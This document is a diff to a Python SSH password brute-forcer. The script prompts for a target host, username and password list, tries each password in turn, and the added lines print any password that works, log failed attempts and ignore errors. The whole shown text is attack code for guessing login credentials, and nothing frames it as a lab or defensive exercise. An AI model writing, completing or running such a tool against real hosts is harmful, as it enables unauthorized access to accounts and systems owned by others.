@@ -23,6 +23,7 @@ def ssh_connect(password, code=0):
 host = input('[+] Target address: ')
 username = input('[+] SSH username: ')
 input_file = input('[+] Passwords file: ')
+print('\n')
 
 if os.path.exists(input_file) == False:
     print('[!!] That file/path doesn\'t exist')
@@ -33,3 +34,13 @@ with open(input_file, 'r') as file:
         password = line.strip()
         try:
             response = ssh_connect(password)
+            if response == 0:
+                print(termcolor.colored(('[+] Found password: {} , for account: {}'.format(password, username)), 'green'))
+                break
+            elif response == 1:
+                print('[-] Incorrect login: {}'.format(password))
+            elif response == 2:
+                print('[!!] Can\'t connect')
+        except Exception as e:
+            print(e)
+            pass
